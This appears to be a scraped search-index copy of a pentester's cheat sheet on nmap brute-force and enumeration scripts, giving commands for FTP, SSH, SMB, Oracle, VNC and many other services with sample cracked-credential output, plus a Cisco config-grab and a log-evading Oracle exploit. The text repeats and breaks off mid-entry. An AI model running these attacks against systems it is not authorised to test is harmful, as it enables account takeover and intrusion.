root:secret - Valid credentials | Statistics |_ Performed 1946 guesses in 23 seconds, average tps: 82 Backorifice - Brute-Force nmap -sU --script backorifice-brute 192.168.1.12 --script-args backorifice-brute. |PORT STATE SERVICE |31337/udp open BackOrifice | backorifice-brute: | Accounts: | michael => Valid credentials | Statistics |_ Perfomed 60023 guesses in 467 seconds, average tps: 138 Cassandra - Brute-Force Performs Brute-Force password auditing against the Cassandra database nmap -p 9160 192.168.1.12 --script=cassandra-brute |PORT STATE SERVICE VERSION |9160/tcp open apani1? | cassandra-brute: | Accounts | admin:lover - Valid credentials | admin:lover - Valid credentials | Statistics |_ Performed 4581 guesses in 1 seconds, average tps: 4581 Citrix - Brute-Force-xml Attempts to guess valid credentials for the Citrix PN Web Agent XML Service The XML service authenticates against the local Windows server or the Active Directory_ nmap --script=citrix - Brute-Force-xml --script-args=userdb=<userdb>,passdb=<passdb>,ntdomain=<domain> -p 80,443,8080 192.168.1.12 |PORT STATE SERVICE REASON |8080/tcp open http-proxy syn-ack | citrix-brute-xml: | Joe:password => Must change password at next logon | Luke:summer => Login was successful |_ Jane:secret => Account is disabled Cisco - Cvs - Test whether host is vulnerable or not nmap -p 4786 -v 192.168.0.1 # By default, it will just test whether host is vulnerable or not nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse You can pass argument to get config If you are attacking public ip, make sure to provide your public ip to the script (cisco-siet.addr= ) nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse --script-args \"cisco-siet.get\" Cvs - Brute-Force Performs Brute-Force password auditing against CVS pserver authentication nmap -p 2401 --script cvs-brute 192.168.1.12 |2401/tcp open cvspserver syn-ack | cvs-brute: | Accounts | hotchner:francisco - Account is valid | reid:secret - Account is valid | Statistics |_ Performed 544 guesses in 14 seconds, average tps: 38 Cvs Repository - Brute-Force Attempts to guess the name of the CVS repositories hosted on the remote server With knowledge of the correct repository name, usernames and passwords can be guessed_ nmap -p 2401 --script cvs-brute-repository 192.168.1.12 |PORT STATE SERVICE REASON |2401/tcp open cvspserver syn-ack | cvs-brute-repository: | Repositories | /myrepos | /demo | Statistics |_ Performed 14 guesses in 1 seconds, average tps: 14 Deluge-RPC - Brute-Force Performs Brute-Force password auditing against the DelugeRPC daemon nmap --script deluge-rpc-brute -p 58846 192.168.1.12 |PORT STATE SERVICE REASON TTL |58846/tcp open unknown syn-ack 0 | deluge-rpc-brute: | Accounts | admin:default - Valid credentials | Statistics |_ Performed 8 guesses in 1 seconds, average tps: 8 Domcon - Brute-Force Performs Brute-Force password auditing against the Lotus Domino Console nmap --script domcon-brute -p 2050 192.168.1.12 |PORT STATE SERVICE REASON |2050/tcp open unknown syn-ack | domcon-brute: | Accounts |_ patrik karlsson:secret => Login correct DPAP - Brute-Force Performs Brute-Force password auditing against an iPhoto Library nmap --script dpap-brute -p 8770 192.168.1.12 |PORT STATE SERVICE REASON |8770/tcp open apple-iphoto syn-ack | dpap-brute: | Accounts | secret => Login correct | Statistics |_ Perfomed 5007 guesses in 6 seconds, average tps: 834 DRDA - Brute-Force Performs password guessing against databases sup |PORTing the IBM DB2 protocol such as Informix, DB2 and Derby nmap -p 50000 --script drda-brute 192.168.1.12 |PORT STATE SERVICE REASON |50000/tcp open drda | drda-brute: |_ db2admin:db2admin => Valid credentials FTP - Brute-Force Performs Brute-Force password auditing against FTP servers nmap --script ftp-brute -p 21 192.168.1.12 |PORT STATE SERVICE |21/tcp open ftp | ftp-brute: | Accounts | root:root - Valid credentials | Statistics |_ Performed 510 guesses in 610 seconds, average tps: 0 HTTP - Brute-Force Performs Brute-Force password auditing against http basic, digest and ntlm authentication nmap --script http-brute -p 80 192.168.1.12 |PORT STATE SERVICE REASON |80/tcp open http syn-ack | http-brute: | Accounts: | user:user - Valid credentials |_ Statistics: Performed 123 guesses in 1 seconds, average tps: 123 HTTP-Form - Brute-Force Performs Brute-Force password auditing against http form-based authentication nmap --script http-form-brute -p 80 192.168.1.12 |PORT STATE SERVICE REASON |80/tcp open http syn-ack | http-form-brute: | Accounts | Patrik Karlsson:secret - Valid credentials | Statistics |_ Perfomed 60023 guesses in 467 seconds, average tps: 138 HTTP-IIS-Short-Name - Brute-Force Attempts to Brute-Force the 8_3 filenames (commonly known as short names) of files and directories in the root folder of vulnerable IIS servers This script is an implementation of the PoC \"iis shortname scanner\"_ nmap -p80 --script http-iis-short-name-brute 192.168.1.12 |PORT STATE SERVICE |80/tcp open http | http-iis-short-name-brute: | VULNERABLE: | Microsoft IIS tilde character \"~\" short name disclosure and denial of service | State: VULNERABLE (Exploitable) | Description: | Vulnerable IIS servers disclose folder and file names with a Windows 8.3 naming scheme inside the webroot folder. | Shortnames can be used to guess or brute force sensitive filenames. Attackers can exploit this vulnerability to | cause a denial of service condition. | | Extra information: | | 8.3 filenames found: | Folders | admini~1 | Files | backup~1.zip | certsb~2.zip | siteba~1.zip | | References: | http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf |_ https://github.com/irsdl/IIS-ShortName-Scanner HTTP-Joomla - Brute-Force Performs Brute-Force password auditing against Joomla web CMS installations nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-joomla-brute.hostname=domain.com,http-joomla-brute.threads=3,brute.firstonly=true' 192.168.1.12 |PORT STATE SERVICE REASON |80/tcp open http syn-ack | http-joomla-brute: | Accounts | xdeadbee:i79eWBj07g => Login correct | Statistics |_ Perfomed 499 guesses in 301 seconds, average tps: 0 HTTP-Proxy - Brute-Force Performs Brute-Force password guessing against HTTP proxy servers nmap --script http-proxy-brute -p 8080 192.168.1.12 |PORT STATE SERVICE |8080/tcp open http-proxy | http-proxy-brute: | Accounts | patrik:12345 - Valid credentials | Statistics |_ Performed 6 guesses in 2 seconds, average tps: 3 HTTP-WordPress - Brute-Force Performs Brute-Force password auditing against Wordpress CMS/blog installations nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.12 |PORT STATE SERVICE REASON |80/tcp open http syn-ack | http-wordpress-brute: | Accounts | 0xdeadb33f:god => Login correct | Statistics |_ Perfomed 103 guesses in 17 seconds, average tps: 6 IAX2 - Brute-Force Performs Brute-Force password auditing against the Asterisk IAX2 protocol Guessing fails when a large number of attempts is made due to the maxcallnumber limit (default 2048)_ In case your getting \"ERROR: Too many retries, aborted ___\" after a while, this is most likely what's happening_ In order to avoid this problem try: - reducing the size of your dictionary - use the brute delay option to introduce a delay between guesses - split the guessing up in chunks and wait for a while between them_ nmap -sU -p 4569 192.168.1.12 --script iax2-brute | PORT STATE SERVICE |4569/udp open |filtered unknown | iax2-brute: | Accounts | 1002:password12 - Valid credentials | Statistics _ Performed 1850 guesses in 2 seconds, average tps: 925 IMAP - Brute-Force Performs Brute-Force password auditing against IMAP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication nmap -p 143,993 --script imap-brute 192.168.1.12 |PORT STATE SERVICE REASON |143/tcp open imap syn-ack | imap-brute: | Accounts | braddock:jules - Valid credentials | lane:sniper - Valid credentials | parker:scorpio - Valid credentials | Statistics |_ Performed 62 guesses in 10 seconds, average tps: 6 Impress-Remote-Discover Tests for the presence of the LibreOffice Impress Remote server Checks if a PIN is valid if provided and will bruteforce the PIN if requested_ nmap -p 1599 --script impress-remote-discover 192.168.1.12 |PORT STATE SERVICE Version |1599/tcp open impress-remote LibreOffice Impress remote 4.3.3.2 | impress-remote-discover: | Impress Version: 4.3.3.2 | Remote PIN: 0000 |_ Client Name used: Firefox OS Informix - Brute-Force Performs Brute-Force password auditing against IBM Informix Dynamic Server nmap --script informix-brute -p 9088 192.168.1.12 |PORT STATE SERVICE |9088/tcp open unknown | informix-brute: | Accounts | ifxnoob:ifxnoob => Valid credentials | Statistics |_ Perfomed 25024 guesses in 75 seconds, average tps: 320 IPMI - Brute-Force Performs Brute-Force password auditing against IPMI RPC server nmap -sU --script ipmi-brute -p 623 192.168.1.12 |PORT STATE SERVICE REASON |623/udp open |filtered unknown | ipmi-brute: | Accounts |_ admin:admin => Valid credentials IRC - Brute-Force Performs Brute-Force password auditing against IRC (Internet Relay Chat) servers nmap --script irc-brute -p 6667 192.168.1.12 |PORT STATE SERVICE |6667/tcp open irc | irc-brute: | Accounts | password - Valid credentials | Statistics |_ Performed 1927 guesses in 36 seconds, average tps: 74 IRC-sasl - Brute-Force Performs Brute-Force password auditing against IRC (Internet Relay Chat) servers sup |PORTing SASL authentication nmap --script irc-sasl-brute -p 6667 192.168.1.12 |PORT STATE SERVICE REASON |6667/tcp open irc syn-ack | irc-sasl-brute: | Accounts | root:toor - Valid credentials | Statistics |_ Performed 60 guesses in 29 seconds, average tps: 2 ISCSI - Brute-Force Performs Brute-Force password auditing against iSCSI targets nmap -sV --script=iscsi-brute 192.168.1.12 |PORT STATE SERVICE |3260/tcp open iscsi syn-ack | iscsi-brute: | Accounts | user:password123456 => Valid credentials | Statistics |_ Perfomed 5000 guesses in 7 seconds, average tps: 714 LDAP - Brute-Force Attempts to brute-force LDAP authentication By default it uses the built-in username and password lists_ In order to use your own lists use the userdb and passdb script arguments_ nmap -p 389 --script ldap-brute --script-args ldap.base='\"cn=users,dc=cqure,dc=net\"' 192.168.1.12 |389/tcp open ldap | ldap-brute: |_ ldaptest:ldaptest => Valid credentials | restrict.ws:restricted1 => Valid credentials, account cannot log in from current host | restrict.time:restricted1 => Valid credentials, account cannot log in at current time | valid.user:valid1 => Valid credentials | expired.user:expired1 => Valid credentials, account expired | disabled.user:disabled1 => Valid credentials, account disabled |_ must.change:need2change => Valid credentials, password must be changed at next logon LU-Enum Attempts to enumerate Logical Units (LU) of TN3270E servers nmap --script lu-enum --script-args lulist=lus.txt,lu-enum.path=\"/home/dade/screenshots/\" -p 23 -sV <targets> |PORT STATE SERVICE REASON VERSION |23/tcp open tn3270 syn-ack IBM Telnet TN3270 (TN3270E) | lu-enum: | Logical Units: | LU:BSLVLU69 - Valid credentials |_ Statistics: Performed 7 guesses in 7 seconds, average tps: 1.0 Membase - Brute-Force Performs Brute-Force password auditing against Couchbase Membase servers nmap -p 11211 --script membase-brute |PORT STATE SERVICE |11211/tcp open unknown | membase-brute: | Accounts | buckettest:toledo - Valid credentials | Statistics |_ Performed 5000 guesses in 2 seconds, average tps: 2500 Mikrotik-RouterOS - Brute-Force Performs Brute-Force password auditing against Mikrotik RouterOS devices with the API RouterOS interface enabled nmap -p8728 --script mikrotik-routeros-brute 192.168.1.12 |PORT STATE SERVICE REASON |8728/tcp open unknown syn-ack | mikrotik-routeros-brute: | Accounts | admin:dOsmyvsvJGA967eanX - Valid credentials | Statistics |_ Performed 60 guesses in 602 seconds, average tps: 0 MMouse - Brute-Force Performs Brute-Force password auditing against the RPA Tech Mobile Mouse servers nmap --script mmouse-brute -p 51010 192.168.1.12 |PORT STATE SERVICE |51010/tcp open unknown | mmouse-brute: | Accounts | vanilla - Valid credentials | Statistics |_ Performed 1199 guesses in 23 seconds, average tps: 47 MongoDB - Brute-Force _ Performs Brute-Force password auditing against the MongoDB database_ nmap -p 27017 192.168.1.12 --script mongodb-brute |PORT STATE SERVICE |27017/tcp open mongodb | mongodb-brute: | Accounts | root:Password1 - Valid credentials | Statistics |_ Performed 3542 guesses in 9 seconds, average tps: 393 MS-SQL - Brute-Force Performs password guessing against Microsoft SQL Server (ms-sql) Works best in conjunction with the broadcast-ms-sql-discover script_ nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt 192.168.1.12 nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.12 |PORT STATE SERVICE REASON | ms-sql-brute: | [192.168.100.128\\TEST] | No credentials found | Warnings: | sa: AccountLockedOut | [192.168.100.128\\PROD] | Credentials found: | webshop_reader:secret => Login Success | testuser:secret1234 => PasswordMustChange |_ lordvader:secret1234 => Login Success MySQL - Brute-Force Performs password guessing against MySQL nmap --script=mysql-brute 192.168.1.12 |PORT STATE SERVICE REASON |3306/tcp open mysql | mysql-brute: | Accounts | root:root - Valid credentials MySQL-enum Performs valid-user enumeration against MySQL server using a bug discovered and published by Kingcope ( http://seclists_org/fulldisclosure/2012/Dec/9 ) nmap --script=mysql-enum 192.168.1.12 |PORT STATE SERVICE REASON |3306/tcp open mysql syn-ack | mysql-enum: | Accounts | admin:<empty> - Valid credentials | test:<empty> - Valid credentials | test_mysql:<empty> - Valid credentials | Statistics |_ Performed 11 guesses in 1 seconds, average tps: 11 Nessus-XMLRPC - Brute-Force Performs Brute-Force password auditing against a Nessus vulnerability scanning daemon using the XMLRPC protocol nmap -sV --script=nessus-xmlrpc-brute 192.168.1.12 |PORT STATE SERVICE REASON |8834/tcp open unknown syn-ack | nessus-xmlrpc-brute: | Accounts | nessus:nessus - Valid credentials | Statistics |_ Performed 1933 guesses in 26 seconds, average tps: 73 Netbus - Brute-Force Performs Brute-Force password auditing against the Netbus backdoor (\"remote administration\") service nmap -p 12345 --script netbus-brute 192.168.1.12 |12345/tcp open netbus |_netbus-brute: password123 Nexpose - Brute-Force Performs Brute-Force password auditing against a Nexpose vulnerability scanner using the API 1_1 nmap --script nexpose-brute -p 3780 192.168.1.12 |PORT STATE SERVICE REASON VERSION |3780/tcp open ssl/nexpose syn-ack NeXpose NSC 0.6.4 | nexpose-brute: | Accounts | nxadmin:nxadmin - Valid credentials | Statistics |_ Performed 5 guesses in 1 seconds, average tps: 5 NJE-Node - Brute-Force z/OS JES Network Job Entry (NJE) target node name Brute-Force nmap -sV --script=nje-node-brute 192.168.1.12 nmap --script=nje-node-brute --script-args=hostlist=nje_names.txt -p 175 192.168.1.12 |PORT STATE SERVICE REASON |175/tcp open nje syn-ack | nje-node-brute: | Node Name: | POTATO:CACTUS - Valid credentials |_ Statistics: Performed 6 guesses in 14 seconds, average tps: 0 NJE-Pass - Brute-Force z/OS JES Network Job Entry (NJE) 'I record' password Brute-Forcer nmap -sV --script=nje-pass-brute --script-args=ohost='POTATO',rhost='CACTUS' 192.168.1.12 nmap --script=nje-pass-brute --script-args=ohost='POTATO',rhost='CACTUS',sleep=5 -p 175 192.168.1.12 |PORT STATE SERVICE VERSION |175/tcp open nje IBM Network Job Entry (JES) | nje-pass-brute: | NJE Password: | Password:A - Valid credentials |_ Statistics: Performed 8 guesses in 12 seconds, average tps: 0 Nping - Brute-Force Performs Brute-Force password auditing against an Nping Echo service nmap -p 9929 --script nping-brute 192.168.1.12 |9929/tcp open nping-echo | nping-brute: | Accounts | 123abc => Valid credentials | Statistics |_ Perfomed 204 guesses in 204 seconds, average tps: 1 OMPv2 - Brute-Force Performs Brute-Force password auditing against the OpenVAS manager using OMPv2 nmap -p 9390 --script omp2-brute 192.168.1.12 |PORT STATE SERVICE REASON |9390/tcp open openvas syn-ack | omp2-brute: | Accounts |_ admin:secret => Valid credentials OpenVAS-OTP - Brute-Force Performs Brute-Force password auditing against a OpenVAS vulnerability scanner daemon using the OTP 1_0 protocol nmap -sV --script=openvas-otp-brute 192.168.1.12 |PORT STATE SERVICE REASON VERSION |9391/tcp open ssl/openvas syn-ack | openvas-otp-brute: | Accounts | openvas:openvas - Valid credentials | Statistics '-.> Performed 4 guesses in 4 seconds, average tps: 1 Oracle - Brute-Force Performs Brute-Force password auditing against Oracle servers nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL 192.168.1.12 |PORT STATE SERVICE REASON |1521/tcp open oracle syn-ack | oracle-brute: | Accounts | system:powell => Account locked | haxxor:haxxor => Valid credentials | Statistics |_ Perfomed 157 guesses in 8 seconds, average tps: 19 Oracle - Brute-Force-stealth Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle's O5LOGIN authentication scheme The vulnerability exists in Oracle 11g R1/R2 and allows linking the session key to a password hash_ When initiating an authentication attempt as a valid user the server will respond with a session key and salt_ Once received the script will disconnect the connection thereby not recording the login attempt_ The session key and salt can then be used to Brute-Force the users password_ nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL 192.168.1.12 |PORT STATE SERVICE REASON |1521/tcp open oracle syn-ack | oracle-brute-stealth: | Accounts | dummy:$o5logon$1245C95384E15E7F0C893FCD1893D8E19078170867E892CE86DF90880E09FAD3B4832CBCFDAC1A821D2EA8E3D2209DB6*4202433F49DE9AE72AE2 - Hashed valid or invalid credentials | nmap:$o5logon$D1B28967547DBA3917D7B129E339F96156C8E2FE5593D42540992118B3475214CA0F6580FD04C2625022054229CAAA8D*7BCF2ACF08F15F75B579 - Hashed valid or invalid credentials | Statistics |_ Performed 2 guesses in 1 seconds, average tps: 2 oracle-sid - Brute-Force Guesses Oracle instance/SID names against the TNS-listener nmap --script=oracle-sid-brute --script-args=oraclesids=/path/to/sidfile -p 1521-1560 192.168.1.12 nmap --script=oracle-sid-brute -p 1521-1560 192.168.1.12 |PORT STATE SERVICE REASON |1521/tcp open oracle syn-ack | oracle-sid-brute: | orcl | prod |_ devel pcAnywhere - Brute-Force Performs Brute-Force password auditing against the pcAnywhere remote access protocol nmap --script=pcanywhere-brute 192.168.1.12 |5631/tcp open pcanywheredata syn-ack | pcanywhere-brute: | Accounts | administrator:administrator - Valid credentials | Statistics |_ Performed 2 guesses in 55 seconds, average tps: 0 PostgreSQL - Brute-Force Performs password guessing against PostgreSQL nmap -p 5432 --script pgsql-brute 192.168.1.12 |5432/tcp open pgsql | pgsql-brute: | root:<empty> => Valid credentials |_ test:test => Valid credentials POP3 - Brute-Force Tries to log into a POP3 account by guessing usernames and passwords nmap -sV --script=pop3-brute 192.168.1.12 |PORT STATE SERVICE |110/tcp open pop3 | pop3-brute- |PORTed: | Accounts: | user:pass => Login correct | Statistics: |_ Performed 8 scans in 1 seconds, average tps: 8 Redis - Brute-Force Performs Brute-Force passwords auditing against a Redis key-value store nmap -p 6379 192.168.1.12 --script redis-brute |PORT STATE SERVICE |6379/tcp open unknown | redis-brute: | Accounts | toledo - Valid credentials | Statistics |_ Performed 5000 guesses in 3 seconds, average tps: 1666 RExec - Brute-Force Performs Brute-Force password auditing against the classic UNIX rexec (remote exec) service nmap -p 512 --script rexec-brute 192.168.1.12 |PORT STATE SERVICE |512/tcp open exec | rexec-brute: | Accounts | nmap:test - Valid credentials | Statistics |_ Performed 16 guesses in 7 seconds, average tps: 2 UNIX-RLogin - Brute-Force Performs Brute-Force password auditing against the classic UNIX rlogin (remote login) service This script must be run in privileged mode on UNIX because it must bind to a low source |PORT number_ nmap -p 513 --script rlogin-brute 192.168.1.12 |PORT STATE SERVICE |513/tcp open login | rlogin-brute: | Accounts | nmap:test - Valid credentials | Statistics |_ Performed 4 guesses in 5 seconds, average tps: 0 RPcap - Brute-Force Performs Brute-Force password auditing against the WinPcap Remote Capture Daemon (rpcap) nmap -p 2002 192.168.1.12 --script rpcap-brute |PORT STATE SERVICE REASON |2002/tcp open globe syn-ack | rpcap-brute: | Accounts | monkey:Password1 - Valid credentials | Statistics |_ Performed 3540 guesses in 3 seconds, average tps: 1180 Rsync - Brute-Force Performs Brute-Force password auditing against the rsync remote file syncing protocol nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' 192.168.1.12 |PORT STATE SERVICE REASON |873/tcp open rsync syn-ack | rsync-brute: | Accounts | user1:laptop - Valid credentials | user2:password - Valid credentials | Statistics |_ Performed 1954 guesses in 20 seconds, average tps: 97 RTSP-Url - Brute-Force Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras nmap --script rtsp-url-brute -p 554 192.168.1.12 |PORT STATE SERVICE |554/tcp open rtsp | rtsp-url-brute: | discovered: | rtsp://camera.example.com/mpeg4 | other responses: | 401: |_ rtsp://camera.example.com/live/mpeg4 SMB - Brute-Force Attempts to guess username/password combinations over SMB, storing discovered combinations for use in other scripts Every attempt will be made to get a valid list of users and to verify each username before actually using them_ When a username is discovered, besides being printed, it is also saved in the Nmap registry so other Nmap scripts can use it_ That means that if you're going to run smb - Brute-Force_nse, you should run other smb scripts you want_ This checks passwords in a case-insensitive way, determining case after a password is found, for Windows versions before Vista_ nmap -sU -sS --script smb-brute.nse -p U:137,T:139 192.168.1.12 | smb-brute: | bad name:test => Valid credentials | consoletest:test => Valid credentials, password must be changed at next logon | guest:<anything> => Valid credentials, account disabled | mixcase:BuTTeRfLY1 => Valid credentials | test:password1 => Valid credentials, account expired | this:password => Valid credentials, account cannot log in at current time | thisisaverylong:password => Valid credentials | thisisaverylongname:password => Valid credentials | thisisaverylongnamev:password => Valid credentials |_ web:TeSt => Valid credentials, account disabled SMTP - Brute-Force Performs Brute-Force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication nmap -p 25 --script smtp-brute 192.168.1.12 |PORT STATE SERVICE REASON |25/tcp open stmp syn-ack | smtp-brute: | Accounts | braddock:jules - Valid credentials | lane:sniper - Valid credentials | parker:scorpio - Valid credentials | Statistics |_ Performed 1160 guesses in 41 seconds, average tps: 33 SNMP - Brute-Force Attempts to find an SNMP community string by Brute-Force guessing nmap --script socks-brute -p 1080 192.168.1.12 |PORT STATE SERVICE |1080/tcp open socks | socks-brute: | Accounts | patrik:12345 - Valid credentials | Statistics |_ Performed 1921 guesses in 6 seconds, average tps: 320 SSH - Brute-Force Performs brute-force password guessing against ssh servers nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s 192.168.1.12 |22/ssh open ssh | ssh-brute: | Accounts | username:password | Statistics |_ Performed 32 guesses in 25 seconds. SVN - Brute-Force Performs Brute-Force password auditing against Subversion source code control servers nmap --script svn-brute --script-args svn-brute.repo=/svn/ -p 3690 192.168.1.12 |PORT STATE SERVICE REASON |3690/tcp open svn syn-ack | svn-brute: | Accounts |_ patrik:secret => Login correct Telnet - Brute-Force Performs brute-force password auditing against telnet servers nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s 192.168.1.12 |23/tcp open telnet | telnet-brute: | Accounts | wkurtz:colonel | Statistics |_ Performed 15 guesses in 19 seconds, average tps: 0 TSO-Enu TSO User ID enumerator for IBM mainframes (z/OS) The TSO logon panel tells you when a user ID is valid or invalid with the message: IKJ56420I Userid not authorized to use TSO_ nmap -sV -p 9923 10.32.70.10 --script tso-enum --script-args userdb=tso_users.txt,tso-enum.commands=\"logon applid(tso)\" |PORT STATE SERVICE VERSION |23/tcp open tn3270 IBM Telnet TN3270 | tso-enum: | TSO User ID: | TSO User:RAZOR - Valid User ID | TSO User:BLADE - Valid User ID | TSO User:PLAGUE - Valid User ID |_ Statistics: Performed 6 guesses in 3 seconds, average tps: 2 VMWare Authentication Daemon - BruteForce Performs Brute-Force password auditing against the VMWare Authentication Daemon (vmware-authd) nmap -p 902 192.168.1.12 --script vmauthd-brute |PORT STATE SERVICE |902/tcp open iss-realsecure | vmauthd-brute: | Accounts | root:00000 - Valid credentials | Statistics |_ Performed 183 guesses in 40 seconds, average tps: 4 VNC - Brute-Force Performs Brute-Force password auditing against VNC servers nmap --script vnc-brute -p 5900 192.168.1.12 |PORT STATE SERVICE REASON |5900/tcp open vnc syn-ack | vnc-brute: | Accounts |_ 123456 => Valid credentials VTAM-Enum Many mainframes use VTAM screens to connect to various applications (CICS, IMS, TSO, and many more) nmap --script vtam-enum --script-args idlist=defaults.txt,vtam-enum.command=\"exit;logon applid(logos)\",vtam-enum.macros=truevtam-enum.path=\"/home/dade/screenshots/\" -p 23 -sV <targets> |PORT STATE SERVICE VERSION |23/tcp open tn3270 IBM Telnet TN3270 | vtam-enum: | VTAM Application ID: | applid:TSO - Valid credentials | applid:CICSTS51 - Valid credentials |_ Statistics: Performed 14 guesses in 5 seconds, average tps: 2 XMPP - Brute-Force Performs Brute-Force password auditing against XMPP (Jabber) instant messaging servers nmap -p 5222 --script xmpp-brute 192.168.1.12 |PORT STATE SERVICE |5222/tcp open xmpp-client | xmpp-brute: | Accounts | CampbellJ:arthur321 - Valid credentials | CampbellA:joan123 - Valid credentials | WalkerA:auggie123 - Valid credentials | Statistics |_ Performed 6237 guesses in 5 seconds, average tps: 1247 REQUIREMENTS A device of any kind ;] CONTACT If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu WEB SITE Visit my websites and profiles for the latest info and updated tools @wuseman && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman END!","title":"nmap"},{"location":"linux/nmap/#nmap","text":"As a pentester, we must understand and know what this extremely powerful tool is capable of, it can do SO Much more then just scanning ports ;-)","title":"nmap"},{"location":"linux/nmap/#after-you-installed-nmap-go-get-all-scripts-by-below-command","text":"nmap --script-updatedb","title":"After you installed nmap go get all scripts by below command:"},{"location":"linux/nmap/#afp---brute-force","text":"Performs password guessing against Apple Filing Protocol (AFP) nmap -p 548 --script afp-brute 192.168.1.12 |PORT STATE SERVICE |548/tcp open afp | afp-brute: |_ admin:KenSentMe => Valid credentials","title":"AFP - Brute-Force"},{"location":"linux/nmap/#ajp---brute-force","text":"Performs brute force passwords auditing against the Apache JServ protocol. The Apache JServ Protocol is commonly used by web servers to communicate with back-end Java application server containers nmap -p 8009 192.168.1.12 --script ajp-brute |PORT STATE SERVICE |8009/tcp open ajp13 | ajp-brute: | Accounts | root:secret - Valid credentials | Statistics |_ Performed 1946 guesses in 23 seconds, average tps: 82","title":"AJP - Brute-Force"},{"location":"linux/nmap/#backorifice---brute-force","text":"nmap -sU --script backorifice-brute 192.168.1.12 --script-args backorifice-brute. |PORT STATE SERVICE |31337/udp open BackOrifice | backorifice-brute: | Accounts: | michael => Valid credentials | Statistics |_ Perfomed 60023 guesses in 467 seconds, average tps: 138","title":"Backorifice - Brute-Force"},{"location":"linux/nmap/#cassandra---brute-force","text":"Performs Brute-Force password auditing against the Cassandra database nmap -p 9160 192.168.1.12 --script=cassandra-brute |PORT STATE SERVICE VERSION |9160/tcp open apani1? | cassandra-brute: | Accounts | admin:lover - Valid credentials | admin:lover - Valid credentials | Statistics |_ Performed 4581 guesses in 1 seconds, average tps: 4581","title":"Cassandra - Brute-Force"},{"location":"linux/nmap/#citrix---brute-force-xml","text":"Attempts to guess valid credentials for the Citrix PN Web Agent XML Service The XML service authenticates against the local Windows server or the Active Directory_ nmap --script=citrix - Brute-Force-xml --script-args=userdb=<userdb>,passdb=<passdb>,ntdomain=<domain> -p 80,443,8080 192.168.1.12 |PORT STATE SERVICE REASON |8080/tcp open http-proxy syn-ack | citrix-brute-xml: | Joe:password => Must change password at next logon | Luke:summer => Login was successful |_ Jane:secret => Account is disabled","title":"Citrix - Brute-Force-xml"},{"location":"linux/nmap/#cisco---cvs---test-whether-host-is-vulnerable-or-not","text":"nmap -p 4786 -v 192.168.0.1 # By default, it will just test whether host is vulnerable or not nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse","title":"Cisco - Cvs - Test whether host is vulnerable or not"},{"location":"linux/nmap/#you-can-pass-argument-to-get-config","text":"If you are attacking public ip, make sure to provide your public ip to the script (cisco-siet.addr= ) nmap -p 4786 -v 192.168.0.1 --script ./cisco-siet.nse --script-args \"cisco-siet.get\"","title":"You can pass argument to get config"},{"location":"linux/nmap/#cvs---brute-force","text":"Performs Brute-Force password auditing against CVS pserver authentication nmap -p 2401 --script cvs-brute 192.168.1.12 |2401/tcp open cvspserver syn-ack | cvs-brute: | Accounts | hotchner:francisco - Account is valid | reid:secret - Account is valid | Statistics |_ Performed 544 guesses in 14 seconds, average tps: 38","title":"Cvs - Brute-Force"},{"location":"linux/nmap/#cvs-repository---brute-force","text":"Attempts to guess the name of the CVS repositories hosted on the remote server With knowledge of the correct repository name, usernames and passwords can be guessed_ nmap -p 2401 --script cvs-brute-repository 192.168.1.12 |PORT STATE SERVICE REASON |2401/tcp open cvspserver syn-ack | cvs-brute-repository: | Repositories | /myrepos | /demo | Statistics |_ Performed 14 guesses in 1 seconds, average tps: 14","title":"Cvs Repository - Brute-Force"},{"location":"linux/nmap/#deluge-rpc---brute-force","text":"Performs Brute-Force password auditing against the DelugeRPC daemon nmap --script deluge-rpc-brute -p 58846 192.168.1.12 |PORT STATE SERVICE REASON TTL |58846/tcp open unknown syn-ack 0 | deluge-rpc-brute: | Accounts | admin:default - Valid credentials | Statistics |_ Performed 8 guesses in 1 seconds, average tps: 8","title":"Deluge-RPC - Brute-Force"},{"location":"linux/nmap/#domcon---brute-force","text":"Performs Brute-Force password auditing against the Lotus Domino Console nmap --script domcon-brute -p 2050 192.168.1.12 |PORT STATE SERVICE REASON |2050/tcp open unknown syn-ack | domcon-brute: | Accounts |_ patrik karlsson:secret => Login correct","title":"Domcon - Brute-Force"},{"location":"linux/nmap/#dpap---brute-force","text":"Performs Brute-Force password auditing against an iPhoto Library nmap --script dpap-brute -p 8770 192.168.1.12 |PORT STATE SERVICE REASON |8770/tcp open apple-iphoto syn-ack | dpap-brute: | Accounts | secret => Login correct | Statistics |_ Perfomed 5007 guesses in 6 seconds, average tps: 834","title":"DPAP - Brute-Force"},{"location":"linux/nmap/#drda---brute-force","text":"Performs password guessing against databases sup |PORTing the IBM DB2 protocol such as Informix, DB2 and Derby nmap -p 50000 --script drda-brute 192.168.1.12 |PORT STATE SERVICE REASON |50000/tcp open drda | drda-brute: |_ db2admin:db2admin => Valid credentials","title":"DRDA - Brute-Force"},{"location":"linux/nmap/#ftp---brute-force","text":"Performs Brute-Force password auditing against FTP servers nmap --script ftp-brute -p 21 192.168.1.12 |PORT STATE SERVICE |21/tcp open ftp | ftp-brute: | Accounts | root:root - Valid credentials | Statistics |_ Performed 510 guesses in 610 seconds, average tps: 0","title":"FTP - 